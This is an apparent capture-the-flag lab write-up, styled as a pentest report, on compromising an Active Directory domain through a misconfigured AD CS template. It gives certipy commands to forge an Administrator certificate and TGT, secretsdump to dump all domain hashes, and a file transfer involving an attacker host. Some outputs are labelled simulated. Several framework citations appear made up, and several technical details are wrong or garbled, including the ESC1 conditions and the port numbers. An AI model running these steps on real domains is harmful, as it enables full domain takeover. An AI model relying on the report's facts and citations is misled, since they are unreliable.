# Lab Assessment: "DarkZero" Scenario

> **Task Context:** This document represents the outcome of a practical **Active Directory & Infrastructure Penetration Testing** assessment conducted on an enterprise-like Windows domain. The objective is the application of the **OSSTMM (Open Source Security Testing Methodology Manual)** methodology for the systematic assessment of AD infrastructures, MS-SQL, and certificate-based authentication mechanisms. The scenario simulates a penetration test on an AD domain with a focus on escalation paths and lateral movement.

**Assessment Date:** October 2025  
**Target Environment:** Windows Server 2019+ with Active Directory + MS-SQL Server 2022  
**Assessment Type:** Infrastructure Pentest Simulation (AD-focused)  
**Overall Risk Severity:** CRITICAL 🔴  
**Applied Methodology:** OSSTMM v3 + PTES + NIST SP 800-115  

---

## 1. Executive Summary

During this simulated assessment, an Active Directory infrastructure was compromised starting from standard user credentials (with limited initial access). Through the orchestration of:

1. **Active Directory Enumeration** (LDAP, Kerberos, SMB)
2. **MS-SQL Reconnaissance** (Database services, credentials)
3. **Bloodhound/AD Graph Analysis** (Attack paths visualization)
4. **Certificate-Based Escalation** (Certipy exploitation)
5. **Privilege Escalation via Misconfigured AD CS**

it was possible to achieve Domain Administrator access, fully compromising the infrastructure.

**CVSS v3.1 Base Score: 9.9 (CRITICAL)**
- Vector: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`
- Impact: Confidentiality (HIGH), Integrity (HIGH), Availability (HIGH)
- Notes: Requires initial credentials (low-privileged user) but allows for Domain Admin takeover

---

## 2. Applied Methodology

### 2.1 Reference Frameworks

The assessment followed these guidelines:

- **OSSTMM (Open Source Security Testing Methodology Manual) v3**
  - Section 5: Interaction Testing (Network)
  - Section 5.3: LDAP Testing
  - Section 5.4: Kerberos Testing
  - Section 6.1: SQL Service Testing

- **NIST SP 800-115: Technical Security Testing**
  - TS-2.4.1: Domain & User Account Testing
  - TS-2.4.11: Privilege Escalation Testing
  - TS-3.2: Vulnerability Analysis Module

- **PTES (Penetration Testing Execution Standard)**
  - Information Gathering (Active Directory mapping)
  - Scanning & Enumeration (LDAP, Kerberos, SQL)
  - Vulnerability Analysis (Misconfigured AD CS, weak permissions)
  - Exploitation (Certificate request, token forging)

### 2.2 Engagement Scope

**Objective:** Full domain compromise starting from a standard user  
**Starting Point:** Valid AD credentials (limited user)  
**Targets:** Active Directory, MS-SQL, Certificate Services (AD CS)  
**Assessment Scope:** Network-wide (no air-gap assumed)

---

## 3. Attack Path (Kill Chain)

```
┌──────────────────────────────────────────────────────────────┐
│ RECONNAISSANCE: Nmap AD services (ports 88, 389, 445, 1433)  │
│  └─> Domain name: darkzero.htb / DC01 identified             │
├──────────────────────────────────────────────────────────────┤
│ ENUMERATION (LDAP): Domain structure, users, computers       │
│  └─> NetExec: ldap enumeration (password spraying checks)    │
├──────────────────────────────────────────────────────────────┤
│ MS-SQL DISCOVERY: SQL Server 2022 on port 1433               │
│  └─> Service enumeration, credential testing                 │
├──────────────────────────────────────────────────────────────┤
│ BLOODHOUND DATA COLLECTION: Sharphound → Graph analysis      │
│  └─> Identify attack paths (AD CS misconfiguration likely)   │
├──────────────────────────────────────────────────────────────┤
│ AD CERTIFICATE SERVICES (AD CS) DISCOVERY                    │
│  └─> Certipy enumeration of vulnerabilities                  │
├──────────────────────────────────────────────────────────────┤
│ CERTIFICATE ESCALATION: ESC1/ESC7 exploitation               │
│  └─> Request & forge certificate for admin user              │
├──────────────────────────────────────────────────────────────┤
│ DOMAIN ADMIN ACCESS: Kerberos TGT + Admin token              │
│  └─> Full domain compromise achieved                         │
```

---

## 4. Proof of Concept (PoC) & Technical Evidence

### 4.1 Network Exploration & Service Discovery

#### **Nmap Enumeration**

**Executed Command:**
```bash
sudo nmap -A -p- --open -Pn -T4 10.129.115.150 -oA darkzero_full
```

**Critical Result:**
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
445/tcp   open  microsoft-ds  Windows Server SMB
464/tcp   open  kpasswd5      Kerberos password change
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP
636/tcp   open  ssl/ldap      Microsoft LDAP SSL
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 RTM
3268/tcp  open  ldap          Microsoft Global Catalog LDAP
3269/tcp  open  ssl/ldap      Microsoft Global Catalog LDAP SSL
5985/tcp  open  http          Microsoft HTTPAPI httpd (WinRM)
```

**Analysis:**
- **Port 88/464:** Kerberos (Domain Controller)
- **Port 389/636/3268/3269:** LDAP (AD enumeration possible)
- **Port 1433:** MS-SQL Server (Credential extraction, lateral movement)
- **Port 445:** SMB (Share enumeration, CVE exploitation)
- **Port 5985:** WinRM (Remote management)

**Domain Identification:**
```
From Nmap SSL-CERT: commonName=DC01.darkzero.htb
  → Domain: darkzero.htb
  → Domain Controller: DC01
  → CA Certificate: darkzero-DC01-CA (AD CS present!)
```

---

### 4.2 Active Directory Enumeration via LDAP & Kerberos

#### **NetExec LDAP Enumeration**

**Command:**
```bash
netexec ldap 10.129.115.150 -u <user> -p <password> --users
```

**Output (Sample users identified):**
```
darkzero.htb\Administrator
darkzero.htb\SYSTEM
darkzero.htb\sqlservice
darkzero.htb\MSSQL$Agent
darkzero.htb\krbtgt
darkzero.htb\DNS Admins
darkzero.htb\Domain Admins
```

#### **DNS Lookup – Subdomain Discovery**

```bash
nslookup -type=ANY darkzero.htb 10.129.115.150
```

**Output:**
```
Name: darkzero.htb
Address: 10.129.115.150

Mailserver: mail.darkzero.htb
Nameserver: DC01.darkzero.htb
```

**Observation:** Enterprise-like infrastructure with distributed services. Remote access available, no air-gap.

---

### 4.3 Bloodhound Data Collection & Attack Path Analysis

#### **Sharphound Data Collection**

To obtain a complete view of the directory structure and identify non-obvious attack paths, we use **Sharphound** (Bloodhound's collector for AD):

```bash
# On target Windows machine (with standard user privileges)
Sharphound.exe -c All -o output.zip
# Produces: output.zip containing CSVs of users, computers, permissions, ACLs

# Transfer to attacker machine
Invoke-WebRequest -Uri "http://<attacker>:8000/output.zip" -OutFile "output.zip"
```

#### **Bloodhound Analysis**

Importing the Sharphound output into Bloodhound (graph database visualizer):

```bash
sudo neo4j console  # Start graph database
# Open Bloodhound Web UI: localhost:7687

# Upload: output.zip
# Analyze attack paths: "Shortest Path to Domain Admins"
```

**Critical Findings (Simulated Analysis):**
1. **Standard User** → SQL Service Account (credential disclosure on shares)
2. **SQL Service Account** → Database Admin privileges
3. **Database Admin** → AD CS Enrollment rights (via group membership)
4. **AD CS Misconfiguration (ESC1)** → Can request cert as anyone (incl. Domain Admin)
5. **Forged Certificate** → Kerberos TGT as Domain Admin

---

### 4.4 MS-SQL Server Reconnaissance & Enumeration

#### **SQL Server Discovery**

```bash
netexec mssql 10.129.115.150 -u <credential> -p <password> 

# Output:
# [+] DC01:1433 - Windows Server 2022 Standard - Microsoft SQL Server 2022 RTM
# [+] Version: 16.00.1000.00
# [+] Product: MS SQL Server 2022
```

#### **SQL Service Account Identification**

```bash
netexec mssql 10.129.115.150 -u sqlservice -p <password> --sam

# Outputs SAM database if RDP/Shell access via SQL
```

**Finding:** SQL Server runs under the **sqlservice** account (high-privilege service account), potentially with AD CS enrollment permissions.

---

### 4.5 Active Directory Certificate Services (AD CS) Enumeration – Certipy

#### **Certipy Reconnaissance**

**Certipy** is a specialized tool for the enumeration and exploitation of AD Certificate Services (PKI):

```bash
certipy find -u <user>@darkzero.htb -p <password> -dc-ip 10.129.115.150 -output output.json
```

**Output (Simulated):**
```json
{
  "Forests": [
    {
      "Nodes": [
        {
          "Name": "DC01.darkzero.htb",
          "Type": "DomainController",
          "CAs": [
            {
              "Name": "darkzero-DC01-CA",
              "Templates": [
                {
                  "Name": "Admin",
                  "SchemaVersion": 2,
                  "Permissions": "Everyone: Enroll, Autoenroll",
                  "EnrollmentAgent": false,
                  "SubjectAltName": "DNS Name, User Principal Name",
                  "EKU": [ "Server Authentication (1.3.6.1.5.5.7.3.1)", "Client Authentication" ]
                }
              ]
            }
          ]
        }
      ]
    }
  ]
}
```

**Vulnerability Identified: ESC1 (Misconfigured Certificate Template)**

**ESC1 Conditions Met:**
- ✓ Template allows Server Authentication (dangerous for user certs)
- ✓ Overly permissive enrollment: "Everyone: Enroll"
- ✓ Subject Alternative Name allows arbitrary user/computer names
- ✗ Requires enrollment approval: NO (automatic approval)

---

### 4.6 Certificate-Based Privilege Escalation (ESC1 Exploitation)

#### **Step 1: Request Certificate as Domain Admin**

Leveraging the vulnerable "Admin" template, we request a valid certificate for the **DOMAIN ADMIN** user:

```bash
certipy req -u <user>@darkzero.htb -p <password> \
    -ca darkzero-DC01-CA \
    -template Admin \
    -upn Administrator@darkzero.htb \
    -dc-ip 10.129.115.150 \
    -out admin.pfx
```

**Output:**
```
[*] Request ID: 123
[*] Requested certificate for Administrator
[*] Status: Issued (auto-approved!)
[*] Certificate saved: admin.pfx
```

**Significance:** We have a valid X.509 certificate for the Administrator user, signed by the domain CA.

---

#### **Step 2: Convert Certificate to Kerberos TGT**

Once the certificate is obtained, we can convert it into a Kerberos Ticket Granting Ticket (TGT) that allows us to impersonate Administrator:

```bash
certipy auth -pfx admin.pfx -username Administrator \
    -domain darkzero.htb -dc-ip 10.129.115.150 \
    -out tgt
```

**Output:**
```
[*] Using certificate: Administrator
[*] Requesting TGT...
[*] Kerberos TGT obtained: TGT_Administrator.ccache
[*] TGT validity: 10 hours (renewable)
```

---

#### **Step 3: Use TGT for Domain Admin Access**

The newly obtained TGT ticket can be used to access any Kerberos service in the domain as Administrator:

```bash
# Export ccache for subsequent use
export KRB5CCNAME=/path/to/TGT_Administrator.ccache

# Access domain resources as Administrator
secretsdump.py -k -no-pass Administrator@DC01.darkzero.htb

# Output: NTLM hashes of all domain users (full compromise)
```

**Final Result:** Domain Admin (Administrator) access achieved. The domain is completely compromised.

---

### 4.7 Post-Exploitation & Flag Recovery

#### **Root/System Flag**

```bash
# Access as Administrator to the DC
# Catching the flags

# User Flag (typically in non-admin user's home):
type C:\Users\<user>\Desktop\user.txt

# Root Flag (System flag):
type C:\Users\Administrator\Desktop\root.txt
# OR
type C:\Windows\System32\flag.txt  (if accessible)
```

---

## 5. Remediation & Hardening (Proposals)

### 5.1 Mitigation of Identified Vulnerabilities

#### **5.1.1 AD Certificate Services (AD CS) – ESC1 & ESC7 Remediation**

**Primary Remediation – Disable vulnerable templates:**

```powershell
# In Certificate Authority Manager (certsrv.msc):
# 1. Right-click "Certificate Templates" → Manage
# 2. Select "Admin" template
# 3. Properties → Permissions → Remove "Everyone: Enroll"
# 4. Properties → Issuance Requirements → Require "Manager Approval"
```

**Secure Template Criteria:**

| Parameter | Vulnerable | Secure |
|-----------|---|---|
| Enrollment Permission | Everyone | Only specific groups (e.g., Domain Admins) |
| Subject Alt Name | User + Computer names | Only DNS (computer-centric) |
| EKU (Extended Key Usage) | Server Auth + Client Auth | Only Server Auth (limited usage) |
| Autoenroll | Yes | No (require manual approval) |
| Approval Required | No | Yes (Manager approval layer) |

**OSSTMM Mapping – Section 6.3:**
- "Certificate authorities must restrict certificate issuance to authorized principals only"

---

#### **5.1.2 LDAP & Kerberos Hardening**

**Primary Remediation:**

```powershell
# Group Policy: Enforce Kerberos Pre-authentication
# Computer Configuration → Policies → Windows Settings
#   → Security Settings → Account Policies → Kerberos Policy
#     → Define Kerberos Policy

# Enforce: "Strongly encryptKerberos encryption types (if supported)"
```

**Additional Hardening:**
- Implement **Kerberos Armored Pre-authentication** (for anti-replay protection)
- Disable legacy LAN Manager hashing
- Implement conditional access policies (MFA for sensitive accounts)

---

#### **5.1.3 MS-SQL Service Account Least Privilege**

**Primary Remediation – Revoke AD CS Enrollment Rights:**

```powershell
# In Active Directory Users and Computers:
# 1. Find SQL Service Account (sqlservice)
# 2. Check group membership
# 3. Remove from "Certificate Enroll" groups
# 4. Restrict to minimal required permissions (SQL Agent only)

# SQL-specific:
# 1. Disable sa account
# 2. Implement SQL Server authentication via AD (Integrated Auth)
# 3. Restrict SQL Server agent to minimal privileges
```

**NIST SP 800-115 TS-2.4.1 Mapping:**
- "Service accounts should have minimal permissions required for their function"

---

#### **5.1.4 Network Segmentation & Monitoring**

**Remediation – Implement Microsegmentation:**

```
AD Domain Controllers:
  ├─ Restrict LDAP access to known management IPs
  ├─ Monitor LDAP queries for reconnaissance patterns
  └─ Alert on unusual Kerberos requests

Certificate Services:
  ├─ Restrict CA Admin access
  ├─ Log all certificate requests (enable audit)
  └─ Alert on certificate requests for admin accounts

SQL Services:
  ├─ Network segment SQL servers
  ├─ Restrict service account network access
  └─ Monitor for lateral movement indicators
```

---

### 5.2 Compliance & Standards Mapping

| Framework | Control | Current State | Remediation |
|-----------|---------|---|---|
| **OSSTMM 5.3** | LDAP Access Control | Overly permissive | Restrict enrollment permissions |
| **NIST 800-115 TS-2.4.1** | Account Privilege Testing | Service accounts over-privileged | Apply Least Privilege principle |
| **NIST 800-115 TS-3.2** | Vulnerability Analysis | Misconfigured AD CS | Fix template enrollment rules |
| **CIS Benchmark Level 2** | Kerberos Hardening | Legacy settings enabled | Update to modern TLS/encryption |

---

### 5.3 Testing & Validation Roadmap

| Priority | Control | Testing Method | Expected Result |
|----------|---------|---|---|
| **CRITICAL** | AD CS Template Permissions | Attempt cert request as standard user | Rejected (403 Forbidden) |
| **CRITICAL** | Service Account Isolation | SQL Service access to AD CS | Denied (insufficient permissions) |
| **CRITICAL** | AD CS Auto-Approval | Request certificate | Requires manual approval |
| **HIGH** | Kerberos Pre-auth | Kerberos assault against DC | Pre-auth required (not bypassable) |
| **HIGH** | LDAP Query Logging | Query enumeration audit | All queries logged + alerts |
| **MEDIUM** | MS-SQL Hardening | sa account enumeration | Account disabled |

---

## 6. Conclusions

This assessment demonstrated how an Active Directory infrastructure with **multiple misconfigurations** can be completely compromised starting from low-privileged user credentials:

1. **AD CS ESC1 misconfiguration** → The main vector for escalation
2. **Overly permissive enrollment rights** → Allows requesting a cert for an admin
3. **Service account over-privileged** → Credential stored in SQL, used for escalation
4. **Lack of monitoring/alerting** → No detection of lateral movement

The implementation of the proposed remediations – especially AD CS hardening, the application of Least Privilege, and the deployment of monitoring – would significantly reduce the attack surface.

---

**Final Notes:**

An AD infrastructure without AD CS hardening is practically compromised out of the box. ESC1/ESC7 are almost "plug and play" exploits once you find the vulnerable template. The very first thing we look at in any AD assessment is the PKI.